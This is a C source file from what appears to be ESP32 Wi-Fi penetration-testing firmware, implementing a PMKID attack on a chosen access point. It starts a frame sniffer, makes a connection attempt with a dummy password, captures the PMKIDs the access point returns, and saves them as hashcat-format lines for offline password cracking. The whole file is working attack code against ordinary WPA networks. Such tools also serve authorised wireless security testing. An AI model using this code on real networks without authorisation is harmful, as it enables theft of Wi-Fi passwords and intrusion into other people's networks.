/**
 * @file attack_pmkid.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <stdlib.h>
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "pcap_serializer.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;
static bool analyzer_active = false;
static bool sniffer_active = false;
static bool event_handler_registered = false;
static bool sta_connect_started = false;
static bool pmkid_result_handled = false;

static void free_pmkid_list(pmkid_item_t *item)
{
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        free(item);
        item = next;
    }
}

static void encode_hex(char *out, const uint8_t *bytes, size_t length)
{
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < length; i++) {
        out[i * 2] = hex[bytes[i] >> 4];
        out[i * 2 + 1] = hex[bytes[i] & 0x0f];
    }
    out[length * 2] = '\0';
}

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID...");
    if (event_data == NULL || ap_record == NULL) return;
    pmkid_capture_t *capture = (pmkid_capture_t *) event_data;
    pmkid_item_t *pmkid_item_head = capture->items;
    if (pmkid_result_handled) {
        free_pmkid_list(pmkid_item_head);
        return;
    }
    if (pmkid_item_head == NULL || memcmp(capture->ap_mac, ap_record->bssid, 6) != 0) {
        ESP_LOGW(TAG, "PMKID event without any item");
        free_pmkid_list(pmkid_item_head);
        return;
    }
    pmkid_result_handled = true;

    /* Count nodes first; the list is built with head insertion. */
    unsigned pmkid_item_count = 0;
    for (pmkid_item_t *item = pmkid_item_head; item != NULL; item = item->next) {
        pmkid_item_count++;
    }

    size_t ssid_len = strnlen((const char *) ap_record->ssid, sizeof(ap_record->ssid));
    if (ssid_len > 32) ssid_len = 32;
    if (pmkid_item_count > (ATTACK_STATUS_CONTENT_MAX - 13 - ssid_len) / 16) {
        ESP_LOGE(TAG, "PMKID result exceeds the status protocol limit");
        free_pmkid_list(pmkid_item_head);
        attack_signal_error();
        return;
    }
    unsigned result_size = 6 + 6 + 1 + (unsigned) ssid_len + pmkid_item_count * 16;
    char *content = attack_alloc_result_content(result_size);
    if (content == NULL) {
        free_pmkid_list(pmkid_item_head);
        attack_signal_error();
        return;
    }
    memcpy(content, capture->ap_mac, 6);
    content += 6;
    memcpy(content, capture->sta_mac, 6);
    content += 6;
    content[0] = (uint8_t) ssid_len;
    content += 1;
    memcpy(content, ap_record->ssid, ssid_len);
    content += ssid_len;

    char ap_hex[13];
    char sta_hex[13];
    char ssid_hex[65];
    encode_hex(ap_hex, capture->ap_mac, sizeof(capture->ap_mac));
    encode_hex(sta_hex, capture->sta_mac, sizeof(capture->sta_mac));
    encode_hex(ssid_hex, ap_record->ssid, ssid_len);

    bool persistence_ok = true;
    pmkid_item_t *item = pmkid_item_head;
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        memcpy(content, item->pmkid, 16);
        content += 16;

        char pmkid_hex[33];
        char hashcat_line[160];
        encode_hex(pmkid_hex, item->pmkid, sizeof(item->pmkid));
        snprintf(hashcat_line, sizeof(hashcat_line), "WPA*01*%s*%s*%s*%s",
                 pmkid_hex, ap_hex, sta_hex, ssid_hex);
        if (!pcap_serializer_write_text("pmkid", ap_record->ssid,
                                        ssid_len, hashcat_line)) {
            ESP_LOGE(TAG, "Failed to persist PMKID result");
            persistence_ok = false;
        }

        free(item);
        item = next;
    }

    /* The complete result is in memory; teardown is deferred off the sniffer loop. */
    if (persistence_ok) attack_signal_success();
    else attack_signal_error();
    ESP_LOGD(TAG, "PMKID attack finished");
}

bool attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting PMKID attack...");
    if (attack_config == NULL || attack_config->ap_record == NULL ||
        attack_config->ap_record->primary == 0) {
        ESP_LOGE(TAG, "Invalid PMKID attack configuration");
        return false;
    }
    ap_record = attack_config->ap_record;
    pmkid_result_handled = false;
    wifictl_sniffer_filter_frame_types(true, false, false);
    if (!frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid)) {
        ESP_LOGE(TAG, "Failed to start PMKID frame analysis");
        return false;
    }
    analyzer_active = true;
    esp_err_t err = esp_event_handler_register_with(
        wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register PMKID handler: %s", esp_err_to_name(err));
        return false;
    }
    event_handler_registered = true;
    if (!wifictl_sniffer_start(ap_record->primary)) {
        ESP_LOGE(TAG, "Failed to start sniffer");
        return false;
    }
    sniffer_active = true;
    if (!wifictl_sta_connect_to_ap(ap_record, "dummypassword")) {
        ESP_LOGE(TAG, "Failed to start PMKID connection attempt");
        return false;
    }
    sta_connect_started = true;
    return true;
}

bool attack_pmkid_stop(void){
    bool ok = true;
    if (sta_connect_started) wifictl_sta_disconnect();
    sta_connect_started = false;
    if (sniffer_active && wifictl_sniffer_is_active()) wifictl_sniffer_stop();
    sniffer_active = false;
    if (analyzer_active) frame_analyzer_capture_stop();
    analyzer_active = false;
    if (event_handler_registered) {
        esp_err_t err = esp_event_handler_unregister_with(
            wifictl_sniffer_event_loop(), FRAME_ANALYZER_EVENTS,
            DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler);
        if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
            ESP_LOGW(TAG, "Failed to unregister PMKID handler: %s", esp_err_to_name(err));
            ok = false;
        }
    event_handler_registered = false;
    }
    ok = wifictl_mgmt_ap_restore() && ok;
    ap_record = NULL;
    pmkid_result_handled = false;
    ESP_LOGD(TAG, "PMKID attack stopped");
    return ok;
}
